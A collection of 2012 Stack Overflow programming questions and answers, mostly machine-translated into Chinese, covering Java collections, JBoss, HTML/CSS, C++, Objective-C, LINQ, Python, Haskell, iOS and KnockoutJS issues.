当您从队列中轮询一个项目时，该数组中的槽被清除（设置为`null`），但该数组永远不会真正缩小！这意味着如果您首先向队列提供百万个项目，然后轮询所有这些项目，那么`ArrayDeque`仍然会维护一个包含至少 100 万个条目的数组，所有条目都设置为`null`. 这解释了*查找具有大量“空”元素的数组*消息。

似乎您的应用程序在某个时间点为队列提供了大量元素。尝试（定期？）调用以下代码：

```
queue = new ArrayDeque<String>(queue); 
```

这将复制旧的`queue`、垃圾收集不必要的大内部数组的内容。

请注意，没有*空对象*之类的东西- 如果您从队列中删除了一个项目并且您的代码不再引用该项目 - 它将被垃圾收集。

# jdbc - JDBC connection pool size under JBoos

> ID：10148608
> 
> 赞同：0
> 
> 时间：2012-04-13T21:34:49.767
> 
> 标签：jdbc, jboss

I want to restrict `JDBC connection` pool size in `JBoss`, but I don't want to modify internal server's config files. I use eclipse to deploy the web application, so is that possible to change that value from jboss-web.xml?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T23:23:10.087

不可以。不能从应用程序代码修改容器管理的连接池。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-14T00:09:30.363

可以基于每个数据源配置连接池大小，因此您不会更改 Jboss 的内部结构

基本上你可以设置

```
<!-- The minimum connections in a pool/sub-pool. Pools are lazily constructed on first use -->
<min-pool-size>5</min-pool-size>
<!-- The maximum connections in a pool/sub-pool -->
<max-pool-size>20</max-pool-size> 
```

在文件夹中的*任何*-ds.xml 文件上`deploy`

# html - Multiple input lose focus on click

> ID：10148609
> 
> 赞同：3
> 
> 时间：2012-04-13T21:35:05.537
> 
> 标签：html, input

I have a form containing address fields as such [http://jsfiddle.net/DP3aw/2/](http://jsfiddle.net/DP3aw/2/)

For some reason I have to put the address in multiple text inputs as it is now.

When you click on the 2nd or 3rd input, the focus will jump to the first text field, why is that happening? is there anyway I can prevent that? or do I have to use js/jQuery to stop it from happening?

Thanks!

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:39:52.477

这是因为您在标签`INPUT`内拥有所有元素。`LABEL`单击标签会聚焦相关的输入。由于您的所有输入都在标签内，它们都会触发它，导致焦点跳转到第一个输入（关联的那个）。

固定版本：http: [//jsfiddle.net/DP3aw/3/](http://jsfiddle.net/DP3aw/3/)

## 破碎的

```
<label for="OrgAddr"><span>Address<strong>*</strong></span>
<div><input id="OrgAddr" name="OrgAddr" type="text" class="required" value=""></div>
<div><input id="OrgAddr2" name="OrgAddr2" type="text" value=""></div>
<div><input id="OrgAddr3" name="OrgAddr3" type="text" value=""></div></label> 
```

## 固定的

```
<label for="OrgAddr"><span>Address<strong>*</strong></span></label>
<div><input id="OrgAddr" name="OrgAddr" type="text" class="required" value=""></div>
<div><input id="OrgAddr2" name="OrgAddr2" type="text" value=""></div>
<div><input id="OrgAddr3" name="OrgAddr3" type="text" value=""></div> 
```

## 可能的改进

这是一个语义更正确的版本，它使用 a`FIELDSET`进行一般分组，并为每个单独的输入使用标签。它还演示了单击标签将如何聚焦其关联的输入元素。

[http://jsfiddle.net/njY3U/1/](http://jsfiddle.net/njY3U/1/)

```
<fieldset>
<legend>Address</legend>
    <label for="street1">Street 1</label>
    <div><input type="text" id="street1" /></div>

    <label for="street2">Street 2</label>
    <div><input type="text" id="street2" /></div>

    <label for="city">City</label>
    <div><input type="text" id="city" /></div>

    <!-- ETC -->
</fieldset> 
```

# c++ - Pointing a variable to a member function from a different class type

> ID：10148612
> 
> 赞同：-1
> 
> 时间：2012-04-13T21:35:24.120
> 
> 标签：c++, class, pointers

In C++, how do i call a method member of class A from a class B, using a pointer? By the way Class A and B are of different types.

I read that when a pointer is pointing to member function it can only point member functions within the class. But how can i point to a member function outside the class?

for example:

```
class A
{
public:
    int add(int x)
    {
        return x+x;
    }
};

int main()
{
    typedef int (A::*pointer)();
    pointer func = &A::add;
    A objt;
    B objt2;

    obt2.*func(2);// the compiler give me an error of incompatible with object type ‘B’

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:49:13.633

我认为您可以按如下方式运行它：

```
(*func)(&objt, 2) 
```

更好的选择是使用 boost::bind/boost::function 代替：

```
boost::function<int(int)> func = boost::bind(&A::add, &objt, _1);
func(2); 
```

我刚刚注意到您试图让它像 B 类的方法一样运行。这完全是荒谬的，但是如果您不关心正确性并且喜欢以完全不可预测的结果危险地生活，那么这样做会更容易：

```
((A *) &objt2)->add(2); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:15:32.163

如果`B`使用`A`（调用 some的`A`成员）然后`B` *取决于*`A`并且您可以通过简单地提供`B`指向`A`它可以调用`A`的方法的指针来实现这一点 - 请参见`B1`代码中的下面的类。

您可以将 's 成员的调用包装`A`到一个单独的对象 - 函子中。您可以通过将其实现为模板类并提供对象`A`地址、方法地址和参数来创建通用解决方案。为此，请参阅 class 的实现`B2`。

```
class A
{
public:
    int add(int x)
    {
        return x+x;
    }
};

typedef int (A::*MEMFN)(int);

class B1
{
public:
    void InvokeAAdd(A* pA, int x)
    {
        cout << "result = " << pA->add(x) << endl;
    }
};

template<class T, typename TMemFn, typename TArg, typename TRetVal>
class B2
{
    T* pT;
    TMemFn memFn;
    TArg arg;
public:
    B2(T* pT, TMemFn memFn, TArg arg) : 
      pT(pT), memFn(memFn), arg(arg){}

    TRetVal operator()()
    {
        return (pT->*memFn)(arg);
    }
};

int main()
{
    A a;
    B1 b;
    b.InvokeAAdd(&a, 2);

    B2<A, MEMFN, int, int> b2(&a, &A::add, 2);
    cout << "result (via functor) = " << b2() << endl;
    return 0;
} 
```

输出：

```
result = 4
result (via functor) = 4 
```

# android - DialogFragment in PreferenceActivity

> ID：10148614
> 
> 赞同：17
> 
> 时间：2012-04-13T21:35:29.080
> 
> 标签：android, preferenceactivity, android-dialogfragment

I have defined `dialogfragments` (because Android documentation says that it is better and indeed it is) but now I want to use it in `PreferenceActivity`.

The problem is that I cannot use `getSupportFragmentManager()` there and I cannot use PreferenceFragment since it doesn't work with compatibility library. Looks like a road block scenario.

Can anyone advise on this?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T04:46:35.410

正如您所指出的，PreferenceFragment 不在 android 兼容性包中，不幸的是，没有干净的方法可以解决这个问题。对于我自己的个人项目，我不得不改编 Android 源代码的实现：http: [//grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.0.4_r1。 2/android/preference/PreferenceFragment.java](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.0.4_r1.2/android/preference/PreferenceFragment.java)

这个问题的答案有一些很好的建议： [PreferenceFragment 是否有意从兼容性包中排除？](https://stackoverflow.com/questions/5501431/was-preferencefragment-intentionally-excluded-from-the-compatibility-package)

# javascript - Dynamically load stylesheet in Chrome with callback

> ID：10148615
> 
> 赞同：0
> 
> 时间：2012-04-13T21:35:36.663
> 
> 标签：javascript, css, google-chrome, dynamic

[http://www.phpied.com/when-is-a-stylesheet-really-loaded/](http://www.phpied.com/when-is-a-stylesheet-really-loaded/)

Using this solution has worked great for loading a stylesheet with a callback, except in Chrome.

In Chrome (v18) I can still see the CSS being applied, which screws up some other functions that depend on the height and width settings from the dynamically loaded CSS.

Any ideas???

Thanks!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:44:44.417

在 WebKit 中，您可以轮询 document.styleSheets 的更改，这是一个在lazyload 中执行此操作的函数（取自[https://github.com/rgrove/lazyload/blob/master/lazyload.js](https://github.com/rgrove/lazyload/blob/master/lazyload.js)）

或者只是使用它也做js的那个插件:)

```
function pollWebKit() {
    var css = pending.css, i;

    if (css) {
      i = styleSheets.length;

      // Look for a stylesheet matching the pending URL.
      while (--i >= 0) {
        if (styleSheets[i].href === css.urls[0]) {
          finish('css');
          break;
        }
      }

      pollCount += 1;

      if (css) {
        if (pollCount < 200) {
          setTimeout(pollWebKit, 50);
        } else {
          // We've been polling for 10 seconds and nothing's happened, which may
          // indicate that the stylesheet has been removed from the document
          // before it had a chance to load. Stop polling and finish the pending
          // request to prevent blocking further requests.
          finish('css');
        }
      }
    }
  } 
```

# r - Converting datetime character string to double value of milliseconds since 1 Jan 1960

> ID：10148617
> 
> 赞同：3
> 
> 时间：2012-04-13T21:35:42.367
> 
> 标签：r, date-format, datetime-format, stata

I've found out how to convert a Stata datetime format from milliseconds since Jan 1960 in R from a related question (see below):

```
as.POSIXct(874022400000/1000, origin="1960-01-01") 
```

I am looking to do the opposite in R: i.e. given a datetime expressed as a character string, find out how to return the datetime value as milliseconds since 01 Jan 1960 00:00:00\. Any suggestions would be much appreciated.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:37:16.693

用于`as.numeric`将日期时间强制转换为自纪元以来的秒数。由于 R 使用 1970 作为其原点，因此您必须另外考虑 1960-1970 偏移量。最后，当然，要注意秒到毫秒的转换。

```
> mydate = as.POSIXct(874022400000/1000, origin="1960-01-01")
> 1000 * (as.numeric(mydate) - as.numeric(as.POSIXct('1960-01-01')))
[1] 874022400000 
```

# objective-c - Make an iPhone property read-only in iOS objective-c

> ID：10148619
> 
> 赞同：2
> 
> 时间：2012-04-13T21:35:46.690
> 
> 标签：objective-c, ios

OK basically I have a class in an iPhone app where I want it to some read only propertys. Meaning that the owning class can read and write the property, but other objects can only read it. I try the "readonly" option when I declare the property, but then my class can't even write it. What use is that?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T21:52:19.740

假设您想在您的类中创建一个名为`foo`an的属性。`int``YourClass`

在您的界面 (.h) 文件中执行此操作：

```
@property(readonly) int foo; 
```

然后在您的实现 (.m) 文件中，设置一个类扩展名，您可以在其中重新定义您的属性。

```
@interface YourClass()

@property(readwrite) int foo;

@end 
```

这导致财产是`readonly`公开的，但`readwrite`私人的。

然后，当然，您`foo`在随后的实现中进行综合。

```
@synthesize foo; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-13T21:39:18.747

如果不是太不方便，只需使用类中的 ivar 或“支持”变量来修改值。像这样：

在您的 .h 文件中：

```
@interface ClassName

@property (readonly,nonatomic) NSInteger readOnlyValue;

@end 
```

在您的 .m 文件中：

```
@implementation ClassName

@synthesize readOnlyValue = _readOnlyValue;

_readOnlyValue = 42;

@end 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T21:52:02.270

虽然您可以按照其他答案中所述的方式直接访问 iVar，但更好的解决方案通常是使用类扩展。它们的设计正是为了解决这个问题，并且通过使用它们，您可以在以后轻松地重构您的代码，以便在您的应用程序中向其他类公开 的`readwrite`定义，`@property`而无需将其公开给所有类。

前段时间我写了一个[详细的解释。](http://www.friday.com/bbum/2009/09/11/class-extensions-explained/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T21:37:19.293

You can implement your own setter in the .m class or synteshize as: foo = _foo; so you can call _foo (private variable) internally

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T21:42:24.720

进一步思考，实现这一点的最简单方法是在类扩展中添加一个普通属性，然后只在标题中声明 getter。例如

界面：

```
@interface MyClass: NSObject

- (NSString *)someString;

@end 
```

执行：

```
@interface MyClass ()
@property (nonatomic, retain) NSString *someString;
@end

@implementation MyClass

@synthesize someString;

@end 
```

您将能够使用点符号或其他方式获取和设置，并直接访问`someString`类中的实例变量，并且看到接口的每个人都可以使用点符号或其他方式获取。

# javascript - Using KendoUI Pie Chart, How do you remove white space?

> ID：10148622
> 
> 赞同：5
> 
> 时间：2012-04-13T21:36:07.090
> 
> 标签：javascript, jquery, asp.net, telerik, kendo-ui

I'm using the KendoUI pie chart and I have a lot off white space. What is the best way to remove it. See the image below:

![White Space](../Images/f405a333702c6f88f2d3ba940f57538c.png)

My java script looks like this:

```
<div id="divGraph1" style="width:250px; height:250px;"/>

jQuery("#divGraph1").kendoChart({ 
     legend:{ 
          position: "bottom", 
          padding: 1, 
          margin: 1 
     }, 
     seriesDefaults:{ 
          labels:{ 
               visible: true, 
               template: "#= kendo.format('{0:P}', percentage)#" 
          }, 
          visible: true 
     }, 
     tooltip:{ 
          visible: true, 
          template: "#= category # - #= kendo.format('{0:P}', percentage)#" 
     }, 
     seriesColors: [ 
          "#004990", "#da7633", "#8a7967", "#8b0f04", "#ead766", "#676200", "78496a"
     ], 
     title: { 
          padding: 1, 
          margin: 1 
     }, 
     chartArea: { margin: 1 }, 
     plotArea: { margin: 1 }, 
     series:[{ 
          type: "pie", 
          data: [
               { category: "Facilities in IDN", value: 3 },
               { category: "Standalone Facilities", value: 4 }
           ] 
      }]
 }); 
```

Any Suggestions would be Greatly Appreciated.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-16T18:37:13.530

你能提供容器元素的宽度吗？我可以提供更准确的答案。

从您的图像中，我显示它的宽度约为 475 像素。有一个可用的高度配置选项，您可以使用它来缩小它的大小。它需要一个整数（以像素为单位）。

```
jQuery("#divGraph1").kendoChart({ 
 legend:{ 
      position: "bottom", 
      padding: 1, 
      margin: 1 
 }, 
 seriesDefaults:{ 
      labels:{ 
           visible: true, 
           template: "#= kendo.format('{0:P}', percentage)#" 
      }, 
      visible: true 
 }, 
 tooltip:{ 
      visible: true, 
      template: "#= category # - #= kendo.format('{0:P}', percentage)#" 
 }, 
 seriesColors: [ 
      "#004990", "#da7633", "#8a7967", "#8b0f04", "#ead766", "#676200", "78496a"
 ], 
 title: { 
      padding: 1, 
      margin: 1 
 }, 
 chartArea: {
      margin: 1,
      height:300 /* add this option */
 }, 
 plotArea: { margin: 1 }, 
 series:[{ 
      type: "pie", 
      data: [
           { category: "Facilities in IDN", value: 3 },
           { category: "Standalone Facilities", value: 4 }
       ] 
  }]
}); 
```

如果您不喜欢在选项中传递布局信息（我不喜欢！），Kendo 将从您用来保存图表的 div 继承 CSS。以下 HTML 会将图表限制为 475x300。

```
<div id='divGraph1' style='width:475px;height300px'></div> 
```

# mysql - Adding FK to MySQL Table Not Working

> ID：10148623
> 
> 赞同：0
> 
> 时间：2012-04-13T21:36:07.583
> 
> 标签：mysql, foreign-keys, mysql-workbench, toad

I work with SQL Server and haven't had such an issue adding a FK to a table like I am having with MySQL. The datatypes match up, the foreign key table contains 300K rows, and is taking forever to execute and eventually times out. Am I doing something wrong? I did this in Workbench and Toad, same thing happens.

The relationship is a one to one, with the User table primary key ID being used a a FK for the District Admins table primary key ID.

I dont know how to find the MySQL version, and can't tell you the amount of memory.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-17T17:13:11.883

发现问题是表格排序规则不同。我的新表使用的是 latin1，但现有的表使用的是 UTF8。这就是我依靠 Workbench 得到的结果。

# c# - Return full results linq grouping query

> ID：10148627
> 
> 赞同：0
> 
> 时间：2012-04-13T21:36:51.993
> 
> 标签：c#, linq

I'm trying to group and still retrieve all the data in the table. I'm still pretty new to Linq and can't seem to tell what I'm doing wrong. I not only want to group the results but I still want to retrieve all the columns in the table. Is this possible?

```
 (from r in db.Form
     orderby r.CreatedDate descending
     group r by r.Record into myGroup
     where myGroup.Count() > 0
     where (r.CreatedDate > lastmonth)
     where r.Name == "Test Name"
     select new { r, myGroup.Key, Count = myGroup.Count() }
    ) 
```

Some how "r" loses its context or since I grouped "r" it has been replaced. Not sure.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-17T14:34:38.943

你需要把你的任务分成两个步骤来完成你想要的。

组数据

```
var groupedData = db.Form.Where(item=>item.CreatedDate > lastMonth && item.Name == "Test Name")
                    .OrderByDescending(item=>item.item.CreatedDate)
                    .GroupBy(item=>item.Record)
                    .Select(group => new {Groups = group, Key = group.Key, Count = group.Count()})
                    .Where(item => item.Groups.Any()); 
```

从分组数据中选择`Form`元素

```
var formElements = groupedData.SelectMany(g => g.Groups).ToList(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:39:20.547

由于您要过滤单个记录，因此您应该在分组之前而不是之后过滤它们：

```
(
    from r in db.Form
    where r.CreatedDate > lastMonth)
    where r.Name == "Test Name"
    orderby r.CreatedDate descending
    group r by r.Record into myGroup
    where myGroup.Count() > 0
    select new { Groups = myGroup, myGroup.Key, Count = myGroup.Count() }
)
// Groups is a collection of db.Form instances 
```

# html - Html, CSS vertical align a menu

> ID：10148629
> 
> 赞同：2
> 
> 时间：2012-04-13T21:37:08.810
> 
> 标签：html, css, menu, html-lists

I'm trying to make a menu, but I'm having trouble centering the text to the middle.

```
<div id="menucontainer">
            <ul id="menu">
                <li>@Html.ActionLink("Home", "Index", "Home")</li> | 
                <li>@Html.ActionLink("About", "About", "Home")</li> | 
                <li>@Html.ActionLink("Projects", "Projects", "Home")</li> | 
                <li>@Html.ActionLink("Forum", "Forum", "Home")</li>
            </ul>
        </div>

#menu
{
    background-image: url("../Content/img/bg-menu.png");
    height:50px;
    padding-left:30px;
    padding-right:25px;
    text-align:center;
    border-radius:20px;
    background-repeat:repeat;
    display:block;
    list-style: none;
    margin-left:55%;
    position:absolute;
    color:#aa4dc6;
}
#menu li 
{   
    display:inline;
    padding:5px 10px 9px 10px;
}
#menu a
{
    text-decoration:none;
    color:#606060;
    text-decoration:none;
    text-transform:capitalize;
    font-size:19px;
    font-weight:bold;
    font-family: 'Open Sans', sans-serif;
} 
```

![enter image description here](../Images/843515de6143e6b44a757ff4562b4474.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-13T21:52:17.620

将其与`line-height`元素的相同，`height`并且文本应正确对齐

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-13T21:50:20.567

这个问题有几个解决方案。

这是一个[jsFiddle](http://jsfiddle.net/4bTk5/1/)，它演示了以下所有解决方案。

首先，您可以尝试将`display`属性设置`table-cell`为菜单中的列表项，然后您可以使用`vertical-align:middle`将文本居中。

该解决方案可能会运行良好，因为您可以使用 CSS 使它们表现得像表格单元格，而不是浮动列表项。

```
ul#menu {
    display: table-row;
}
ul#menu li {
    display: table-cell;
    vertical-align: middle;
} 
```

其次，您可以将`line-height`属性设置为列表项的高度。不过要小心这个，因为如果文本换行它会破坏布局：

```
ul#menu li {
    height: 30px;
    line-height: 30px;
} 
```

最后，您可以使用填充来设置列表项的高度，而不是设置固定高度。假设您对顶部和底部使用相同的填充，则文本应居中对齐：

```
ul#menu li {
    padding: 15px 5px 15px 5px;
} 
```

# c# - Sending email with a custom envelope sender (VERP)

> ID：10148631
> 
> 赞同：2
> 
> 时间：2012-04-13T21:37:25.500
> 
> 标签：c#, smtp, verp

I'm writing a server that will send email to many recipients on behalf of my client.

The email must come from the client's email address (client@example.org), but I want to automatically handle bounces via [VERP](http://en.wikipedia.org/wiki/Variable_envelope_return_path). Basically, the email `From:` header will be client@example.org, but the SMTP envelope sender (`MAIL FROM`) will be *unique-email-id*@my-email-service.example.com.

I've already built a multi-threaded sending engine that uses the built-in `System.Net.Mail.SmtpClient` to actually speak SMTP with the recipient's MX server.

Unfortunately, `SmtpClient` does not allow you to specify the envelope sender – it just uses the `From:` address.

I need an alternative that allows me to specify the SMTP `MAIL FROM`. Preferably, something that takes little work to drop in and replace `SmtpClient`.

Thus far, everything I've looked at is an entire [email](http://mailsystem.codeplex.com/) [suite](http://www.lumisoft.ee/lsWWW/ENG/Products/Mail_Server/mail_index_eng.aspx?type=info) (SMTP/POP3/IMAP/kitchen sink). What lightweight SMTP libraries are available?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T08:44:47.387

`System.Net.Mail.SmtpClient`内部`mailMessage.Sender ?? mailMessage.From`用于信封`MAIL FROM`信封发件人。

不幸的是，虽然您可以使用 Sender 属性来指定`MAIL FROM`使用该属性的信封信封发件人`mailMessage.Sender`，但 SmtpClient 还将添加一个`Sender: unique-email-id@domain.com`标头。

使用此 Sender 标头，电子邮件客户端然后显示发送自`unique-email-id@domain.com on behalf of John Doe <doe@domain.com>`

我发现没有像样的开源 Smtp 库支持这一点——甚至 Mono 的 SmtpClient 也缺少这个特性。一些支持 VERP 的库：

*   MailKit/MimeKit [http://www.mimekit.net/](http://www.mimekit.net/)
*   Afterlogic MailBee
*   Limilabs mail.dll
*   电子邮件架构师 EASendMail

PS：请随意投票支持 VERP 功能请求：http: [//visualstudio.uservoice.com/forums/121579-visual-studio/suggestions/3800792-smtpclient-should-allow-to-specify-the-envelope-se](http://visualstudio.uservoice.com/forums/121579-visual-studio/suggestions/3800792-smtpclient-should-allow-to-specify-the-envelope-se)

相关问题：[如何在 .NET 中实现 VERP（可变信封返回路径）？](https://stackoverflow.com/questions/10050779/how-can-i-implement-verp-variable-envelope-return-path-in-net)

# python - Python TypeError: argument of type 'NoneType' is not iterable

> ID：10148637
> 
> 赞同：0
> 
> 时间：2012-04-13T21:37:41.747
> 
> 标签：python, typeerror, nonetype

So for my first big python project I'm building a text based game. It's supposed to be modular so the story and items etc. can be edited and replaced with little editing of the actual source code. Basically, the user command is stored as a string which is immediately broken into a list. The first element is an action like 'inspect' and the second element is a pseudo-argument for that action like 'location' or 'item'. After the command is interpreted, it goes to the execution module called 'item_or_loc' It's here that I get the error. Can anyone help? I'll provide more info or the entire source code if it'll help.

Command module:

```
 def item_or_loc(iolo):
        if iolo in items.items_f():
            print (items.iolo(1))
        elif iolo in locations.locations_f():
            print (locations.iolo(1))
        else:
            print ('Command not recognized, try again.')

    def location(loco):
        plo_l = PlayerClass #(player location object_location)
        if loco == 'location':
            plo_l.player_loc(0)

    def abort(abo):
        sys.exit()

    def inventory(invo):
        pio_i = PlayerClass #(player inventory object_inventory)
        if invo == 'inventory':
            pio_i.player_inv(0) 
```

Items module:

```
 patient_gown=('Patient gown', 'A light blue patient\'s gown.')
    wrench=('Wrench','')
    stick=('Stick','')
    prybar=('Prybar','')
    screwdriver=('Screwdriver','')
    scalpel=('Scalpel','')
    broken_tile=('Broken tile','')
    hatchet=('Hatchet','')
    janitor_suit=('Janitor suit','') 
```

Locations module: Basically the same as the Items module

Player module:

```
 import items
    import locations

    class PlayerClass:
        def player_inv(inv_index):
        pinventory = [items.patient_gown[inv_index]]
        print (pinventory)

    def player_loc(loc_index):
        ploc = [locations.cell[loc_index]]
        print (ploc) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:43:25.917

您不会从`items.items_f`. 您需要返回一个容器或序列。我会建议与下面不同的方法，但至少这是一个开始。

```
def items_f():
    patient_gown=('Patient gown','A light blue patient\'s gown.')
    wrench=('','')
    stick=('','')
    crowbar=('','')
    screwdriver=('','')
    scalpel=('','')
    broken_tile=('','')
    hatchet=('','')
    janitor_suit=('','')
    return (patient_gown, wrench, stick, crowbar, 
            screwdriver, scalpel, broken_tile, hatchet, janitor_suit) 
```

解释一下，`items_f`它不是容器本身，而是一个函数（或更准确地说，一种方法，您可以简单地将其视为“附加”到对象的函数）。函数不必返回任何东西，但是当你调用它们时，调用产生的值*只是*`None`.

现在，当您进行类似的测试时`if x in y:`，`y`必须是序列或容器类型；并且由于您正在测试 function 的结果`items_f`，并且由于该函数`None`按照您在上面定义的方式返回，因此测试会引发错误。

处理这种情况的最佳方法实际上取决于程序的更大结构。朝着正确方向迈出的第一步可能是这样的：

```
def items_f():
    return (('Patient gown', 'A light blue patient\'s gown.'),
            ('Wrench', 'A crescent wrench.'),
            ('Stick', '...')) 
```

但这也可能不是最好的解决方案。根据您在上面添加的内容（顺便说一句，现在缺少该`items_f`功能），我的建议是使用某种包含项目的数据结构。一个简单的方法是字典：

```
items = {'patient_gown':('Patient gown', 'A light blue patient\'s gown.'),
         'wrench':('Wrench', '...'),
          ...
        } 
```

这将创建一个包含所有可能项的字典。现在当你想要一个特定的项目时，你可以像这样得到它：

```
item = items['patient_gown'] 
```

这样你根本不需要函数；您可以直接访问整个字典。

# ios - 如何使用 iOS5 的 viewcontroller 创建通用视图？

> ID：10148639
> 
> 赞同：3
> 
> 时间：2012-04-13T21:37:58.780
> 
> 标签：ios, ios5, uiview, uiviewcontroller, storyboard

我想为 iOS5 开发并有一个情节提要......我刚刚在情节提要上使用 UIViewController 创建了 UIView。我添加了许多其他 UIButtons 和标签，并为 VC 创建了出口。

我想在单个父视图上将此视图与它的视图控制器一起使用 3 次。这怎么可能？我不想复制“很多其他 UIButtons 和标签”......

也许我应该在单独的 XIB 中从情节提要中创建这个视图？我将如何在情节提要中使用 XIB？

![](../Images/72b859cae4372e3be59f35f164a345bf.png)

**更新：**

谢谢你，[Juzzz](https://stackoverflow.com/users/874249/juzzz) - 你的解决方案很完美：

![](../Images/6083f098396008c607fccc3f35623efd.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T22:09:27.080

您必须创建 2 个自定义视图控制器（故事板中的每个视图一个。例如：

```
@interface GraphCollectionViewController : UIViewController

@interface GraphViewController : UIViewController 
```

要连接它们，您可以使用称为： UIViewController 遏制

为您的 GraphCollectionViewController 为您的 UIViews 创建 3 个插座。然后创建 GraphViewController 的 3 个属性（或一个数组，你想要什么）并在视图加载时初始化它们。

```
@property (strong, nonatomic) IBOutlet UIView *topView;
@property (strong, nonatomic) IBOutlet UIView *middleView;
@property (strong, nonatomic) IBOutlet UIView *bottomView;

@property (strong, nonatomic) GraphViewController *topGraphViewController;
@property (strong, nonatomic) GraphViewController *middleGraphViewController;
@property (strong, nonatomic) GraphViewController *bottomGraphViewController;

...

//top graph
    self.topGraphViewController = [storyboard instantiateViewControllerWithIdentifier:@"GraphViewController"]; //init with view from storyboard
    self.topGraphViewController.view.frame = self.topView.bounds; //set frame the same

    [self.view addSubview:self.topGraphViewController.view];
    [self addChildViewController:self.topGraphViewController];
    [self.topGraphViewController didMoveToParentViewController:self];

//middle graph
    self.middleGraphViewController = [storyboard instantiateViewControllerWithIdentifier:@"GraphViewController"]; //init with view from storyboard
    self.middleGraphViewController.view.frame = self.middleView.bounds; //set frame the same

    [self.view addSubview:self.middleGraphViewController.view];
    [self addChildViewController:self.middleGraphViewController];
    [self.middleGraphViewController didMoveToParentViewController:self];

//bottom graph
    self.bottomGraphViewController = [storyboard instantiateViewControllerWithIdentifier:@"GraphViewController"]; //init with view from storyboard
    self.bottomGraphViewController.view.frame = self.bottomView.bounds; //set frame the same

    [self.view addSubview:self.bottomGraphViewController.view];
    [self addChildViewController:self.bottomGraphViewController];
    [self.bottomGraphViewController didMoveToParentViewController:self]; 
```

我认为你说对了。为了更多地理解[这个例子](https://github.com/peterfriese/UIViewControllerContainmentSample)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:42:30.660

您可以创建一个新的视图类（使用它自己的 .h、.m 文件）并将其基于您自己创建的 ViewController。

至于代码：

```
@interface ViewController : UIViewController 
```

假设上面是您想在其他地方使用的原始 ViewController。这里面有按钮、标签等。

当您创建一个新的视图类时，它基于您自己而不是 UIViewController 类，如下所示：

```
@interface MyNewController : ViewController 
```

现在 MyNewController 基于您之前创建的 ViewController，它应该还有您创建的按钮、标签等。

编辑：您可能还必须在情节提要中更改视图的基类。单击要更改的视图，查看右侧属性窗口，在自定义类下选择您自己的控制器，在本例中为 ViewController。

# haskell - 如何在 Haskell 中嵌套 let 语句？

> ID：10148642
> 
> 赞同：14
> 
> 时间：2012-04-13T21:38:19.933
> 
> 标签：haskell, let

我正在尝试嵌套几个 let 语句，但是我遇到了对我没有意义的语法错误。我对 Haskell 编程真的很陌生，所以我确定这是我不理解的东西（可能与间距有关）。我知道 let 和 in 必须在同一列中。

为什么会这样：

```
aaa = let y = 1+2
          z = 4+6
      in y+z 
```

工作得很好，而

```
aaa = let y = 1+2
          z = 4+6
          in let f = 3
                 e = 3
             in e+f 
```

给我错误：“表达式中的语法错误（意外的`='）”

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-04-13T21:48:41.817

在第二个示例中， 与`z = ...`不对齐`y = ...`。在一个`let`块中，每个定义都必须对齐。

我怀疑您正在使用制表符缩进，并将您的编辑器设置为将制表符显示为少于 8 个空格，使其看起来与您对齐。您应该将制表符替换为空格，并且最好将您的编辑器设置为将制表符扩展为空格，以避免将来出现此类问题。

# macos - 如何制作动画NSCursor？

> ID：10148647
> 
> 赞同：1
> 
> 时间：2012-04-13T21:38:36.800
> 
> 标签：macos, animated-gif, nscursor

有没有办法`NSCursor`用我的自定义 gif 图像制作动画？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:58:23.510

不幸的是，不——最好的办法是创建一个`NSCursor`s 数组，为图像的每一帧创建一个 s 数组，然后使用您喜欢的任何动画策略自行设置它们（也许是`NSTimer`？）。

# knockout.js - KnockoutJS 映射更新无法与样式绑定一起正常工作

> ID：10148649
> 
> 赞同：2
> 
> 时间：2012-04-13T21:38:42.970
> 
> 标签：knockout.js, knockout-mapping-plugin

我有一个看起来像这样的 KnockoutJS 模板：

```
<div data-bind="template: {name: 'testTemplate', data: people}"></div>

<script id="testTemplate" type="text/html">
    <!--ko foreach: $data-->        
    <div class="items" data-bind="text: full() + ' updated at: ' + Date()"></div>
    <!--/ko-->
</script> 
```

在运行第 N 次测试后，我意识到创建这样的模板是有缺陷的，因为 KnockoutJS 每次都会更新模板，即使数据没有改变。

我已经使用这两个小提琴来说明这一点：

*   [使用 foreach 绑定](http://jsfiddle.net/farina/bVPwM/1/)（正常工作）
*   [使用数据绑定](http://jsfiddle.net/farina/bVPwM/3/)（非常失败）

如您所见，如果您在 foreach 绑定上点击初始加载或加载更新的数据按钮，除非数据实际更改，否则 UI 永远不会重新渲染。不幸的是，如果您对数据样式绑定执行相同操作，则每次都会重新渲染。

我真的无法弄清楚有什么区别。我的印象是数据绑定的工作方式与 foreach 相同，但允许对模板内的对象进行更多控制。

我使用它的唯一原因是因为我有一组嵌套模板，并且我需要更接近手头的实际对象。我应该能够重新考虑，并摆脱这种方法，但我仍然想知道为什么这是一个问题。

